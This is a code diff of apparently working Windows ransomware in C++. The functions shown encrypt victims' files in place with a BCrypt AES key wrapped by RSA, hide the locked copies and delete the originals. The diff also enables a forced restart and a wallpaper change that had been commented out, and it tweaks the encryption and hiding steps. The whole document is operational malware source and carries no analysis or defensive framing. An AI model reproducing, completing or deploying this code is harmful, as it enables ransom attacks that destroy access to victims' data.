@@ -214,14 +214,14 @@ int encryption_main( bool fromStart) {
 	changeHiddenFileState(true);
 	remove(pathToENC);
 #if VM
-	changeWallPaper(pathToImage);//TODO move to notify
+	changeWallPaper(pathToImage);
 #endif
 
 CLEAN:
 	if (id)
 		HeapFree(GetProcessHeap(), 0, id);
 #if VM
-	//doRestart();
+	doRestart();
 #endif
 	return 0;
 }
@@ -551,7 +551,7 @@ static void iterate(const path& parent,
 {
 	string path;
 	directory_iterator end_itr;
-	static long long sumSize;
+	static long long sumSize = 0;
 	Status status = STATUS_SUCCESS;
 	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
 		try {
@@ -637,7 +637,9 @@ Status partialEncrypt(const string& path, RsaEncryptor& rsaEncryptor)
 	DWORD resSize = 0;
 	boost::filesystem::path path_path = path;
 	Status status = STATUS_UNSUCCESSFUL;
+	//std::cout << "Partial encrypt " + path << std::endl;
 	if (!GetDiskFreeSpaceEx(path_path.parent_path().string().c_str(), &freeSpace, NULL, NULL)) {
+		std::cout << "not enough space" << std::endl;
 		goto PART_ENC_CLEANUP;
 	}
 	size_t fileSize = getFileSize(path);
@@ -648,48 +650,54 @@ Status partialEncrypt(const string& path, RsaEncryptor& rsaEncryptor)
 	}
 	if (fileSize + 146 < freeSpace.QuadPart)
 	{
-		if(!initPlainText(path, &plaintext,sz, sz))//50*2^20 = 50MB
+		if (!initPlainText(path, &plaintext, sz, sz))//50*2^20 = 50MB
 		{
-			std::cout << "failed on initPlaintext";
+			//std::cout << "failed on initPlaintext";
 			goto PART_ENC_CLEANUP;
 		}
-		if(!myCopyFiles(path,0,sz,path+PART_LOCKED_EXT,0))
+		if (!myCopyFiles(path, 0, sz, path + PART_LOCKED_EXT, 0))
 		{
+			//std::cout << "failed on copy first part" << std::endl;
 			goto PART_ENC_CLEANUP;
 		}
-
-		if(!NT_SUCCESS(generateKeyAndIV(&iv,&key)))
+		makeFileHidden(path + PART_LOCKED_EXT);
+		if (!NT_SUCCESS(generateKeyAndIV(&iv, &key)))
 		{
+			//std::cout << "failed on generate key" << std::endl;
 			goto PART_ENC_CLEANUP;
 		}
-		if(!NT_SUCCESS(getKeyHandle(key,keyHandle,algHandle)))
+		if (!NT_SUCCESS(getKeyHandle(key, keyHandle, algHandle)))
 		{
+			//std::cout << "failed on get key handle" << std::endl;
 			goto PART_ENC_CLEANUP;
 		}
-		tmpIv=(PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
+		//std::cout << "begin encrypt" << std::endl;
+		tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
 		if (NULL == tmpIv) {
+			//std::cout << "failed on alloc mem for iv" << std::endl;
 			goto PART_ENC_CLEANUP;
 		}
-		if(!NT_SUCCESS(BCryptEncrypt(keyHandle, plaintext, sz, NULL, tmpIv, IV_LEN, NULL, 0, &cipherSize, BCRYPT_BLOCK_PADDING)))
+		if (!NT_SUCCESS(BCryptEncrypt(keyHandle, plaintext, sz, NULL, tmpIv, IV_LEN, NULL, 0, &cipherSize, BCRYPT_BLOCK_PADDING)))
 		{
-			std::cout << "big file encrypt (first pass) failed" << std::endl;
+			//std::cout << "big file encrypt (first pass) failed" << std::endl;
 			goto PART_ENC_CLEANUP;
 		}
 		encBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cipherSize);
 		if (NULL == encBuffer) {
-			goto PART_ENC_CLEANUP;
-		}
-		
-		if(!NT_SUCCESS(BCryptEncrypt(keyHandle,plaintext,sz, NULL, tmpIv, IV_LEN, encBuffer, cipherSize,&resSize, BCRYPT_BLOCK_PADDING)))
-		{
-			std::cout << "big file encrypt (2nd pass) failed" << std::endl;
+			//std::cout << "failed to alloc buffer for cipher" << std::endl;
 			goto PART_ENC_CLEANUP;
 		}
 
+		if (!NT_SUCCESS(BCryptEncrypt(keyHandle, plaintext, sz, NULL, tmpIv, IV_LEN, encBuffer, cipherSize, &resSize, BCRYPT_BLOCK_PADDING)))
+		{
+			//std::cout << "big file encrypt (2nd pass) failed" << std::endl;
+			goto PART_ENC_CLEANUP;
+		}
+		//std::cout << "finished encrypt" << std::endl;
 		keyIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
 		if (keyIv == nullptr)
 		{
-			//status = STATUS_UNSUCCESSFUL;
+			//std::cout << "failed on alloc buff for keyIv" << std::endl;
 			goto PART_ENC_CLEANUP;
 		}
 		memcpy(keyIv, key, KEY_LEN);
@@ -698,15 +706,17 @@ Status partialEncrypt(const string& path, RsaEncryptor& rsaEncryptor)
 		keyIvBuffer = rsaEncryptor.encrypt(keyIv, KEY_LEN + IV_LEN);
 		if (!keyIvBuffer)
 		{
-			//status = STATUS_UNSUCCESSFUL;
+			//std::cout << "failed on keyiv encrypt" << std::endl;
 			goto PART_ENC_CLEANUP;
 		}
-		outFile.open(path + PART_LOCKED_EXT, std::ios::binary| std::fstream::app);
+		//std::cout << "finished rsa encrypt" << std::endl;
+		outFile.open(path + PART_LOCKED_EXT, std::ios::binary | std::fstream::app);
 		if (!outFile.is_open())
 		{
+			//std::cout << "failed on open file for apped" << std::endl;
 			goto PART_ENC_CLEANUP;
 		}
-		//outFile.seekp(0, outFile.end);
+
 		outFile.seekp(sz);
 		int padding = 16 - (resSize % 16);
 		outFile << padding;
@@ -714,19 +724,23 @@ Status partialEncrypt(const string& path, RsaEncryptor& rsaEncryptor)
 		outFile.write((char*)keyIvBuffer, ENCRYPTED_KEY_IV_LEN);
 		if (outFile.fail())
 		{
+			//std::cout << "failed on enc keyIV write" << std::endl;
 			goto PART_ENC_CLEANUP;
 		}
 		outFile.write((char*)encBuffer, resSize);
 		if (outFile.fail())
 		{
+			//std::cout << "failed on enc payload write" << std::endl;
 			goto PART_ENC_CLEANUP;
 		}
 		size_t currentPlace = outFile.tellp();
 		outFile.close();
 		//	read rest of file and write it (just go over the file in some manner)
-		if (!myCopyFiles(path, 2 * sz, fileSize, path + PART_LOCKED_EXT, currentPlace))
+		if (!myCopyFiles(path, 2 * sz, fileSize, path + PART_LOCKED_EXT, currentPlace)){
+			//std::cout << "failed on myCopyFiles second time" << std::endl;
 			goto PART_ENC_CLEANUP;
-		makeFileHidden(path + PART_LOCKED_EXT);
+		}
+		
 		status = STATUS_SUCCESS;
 	}
 	else 
@@ -737,6 +751,7 @@ Status partialEncrypt(const string& path, RsaEncryptor& rsaEncryptor)
 		//	total shift of 146 bytes.
 		//  go over file from end to beginning and shift data in 146B up to the 100MB line.
 		//  encrypt the 2nd 50 MB  block. 
+		std::cout << "not enough free space" << std::endl;
 		return STATUS_UNSUCCESSFUL;//to avoid removing the file
 		//but we don't have time to implement, so skip
 	}
